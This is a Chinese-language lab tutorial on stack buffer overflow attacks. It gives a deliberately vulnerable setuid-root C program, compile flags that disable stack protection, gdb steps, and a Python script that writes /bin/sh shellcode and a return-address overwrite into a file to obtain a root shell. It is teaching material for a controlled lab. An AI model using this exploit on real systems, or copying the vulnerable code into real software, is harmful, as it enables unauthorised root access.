# 栈的缓冲区溢出攻击

(代码文件可在**课程网站**或者 https://github.com/PeiweiHu/SEEDLabs/tree/main/stack_overflow 找到)

## 1. 关闭地址空间随机化

这一步是为了获取固定的栈地址，方便后续的攻击。

```bash
sudo sysctl -w kernel.randomize_va_space=0
```

## 2. 准备有漏洞的程序

```c
// stack.c

#include "stdio.h"
#include "stdlib.h"
#include "string.h"

int foo(char *str) {
    char buffer[100];

	strcpy(buffer, str);
	return 1;
} 

int main(int argc, char **argv) {
	char str[400];
	FILE *badfile;

	badfile = fopen("badfile", "r");
	fread(str, sizeof(char), 300, badfile);
	foo(str);

	printf("Returned Properly\n");
	return 1;
}
```

对其进行编译，并设置为setuid程序：

```bash
gcc -o stack -z execstack -fno-stack-protector stack.c
sudo chown root stack
sudo chmod 4755 stack
```

其中，`-z execstack`设置栈为可执行，`-fno-stack-protector`关闭StackGuard机制。

## 3. 通过调试寻找注入地址

```bash
# 为了方便调试时断点设置，编译一个含有符号信息的stack
gcc -g -o stack_dbg -z execstack -fno-stack-protector stack.c
# 使用gdb进行调试
gdb stack_dbg
# 对foo函数设置断点
b foo
# 运行程序，程序会在断点处停止
r
# 打印ebp寄存器和buffer变量的地址
p $ebp
p &buffer
```

## 4. 生成badfile

```python
#!/usr/bin/python3

import sys

shellcode = (
	"\x31\xc0" 	# xorl %eax,%eax
	"\x50" 	   	# %eax
	"\x68""//sh"	# pushl $0x68732f2f
	"\x68""/bin"	# pushl $0x6e69622f
	"\x89\xe3"	# movl %esp,%ebx
	"\x50"		# pushl %eax
	"\x53"		# pushl %ebx
	"\x89\xe1"	# movl %esp,%ecx
	"\x99"		# cdq
	"\xb0\x0b"	# movb $0x0b,%al
	"\xcd\x80"	# int $0x80
).encode('latin-1')

# fill with nop
content = bytearray(0x90 for i in range(300))

# put the shellcode
start = 300 - len(shellcode)
content[start:] = shellcode

# set the entry point of the shellcode
ret = 0xbfffeb98 + 100
content[112:116] = (ret).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as wb:
	wb.write(content)
```

+ 注意！上述代码中 `ret = 0xbfffeb98 + 100`的`0xbfffeb98`替换为你自己调试时的`p $ebp`值

对上述文件增加执行权限后执行，生成badfile：

```bash
chmod u+x exploit.py
./exploit.py
```
这时生成了badfile。

## 5. 执行攻击

与之前实验类似，首先替换掉含有保护机制的shell。

```bash
sudo ln -sf /bin/zsh /bin/sh
```

执行漏洞程序获得root shell。

```bash
./stack
id
```